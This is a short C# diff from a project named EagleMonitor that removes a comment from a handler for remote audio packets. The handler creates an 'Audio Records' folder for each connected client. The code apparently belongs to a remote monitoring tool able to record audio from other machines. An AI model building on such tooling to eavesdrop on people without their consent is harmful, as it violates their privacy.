@@ -17,7 +17,6 @@ namespace EagleMonitor.PacketParser
             {
                 ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].remoteAudioForm.BeginInvoke((MethodInvoker)(() =>
                 {
-                    //audioHelper
                     if (!System.IO.Directory.Exists(ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].clientPath + "\\Audio Records\\"))
                         System.IO.Directory.CreateDirectory(ClientHandler.ClientHandlersList[remoteAudioPacket.baseIp].clientPath + "\\Audio Records");
 
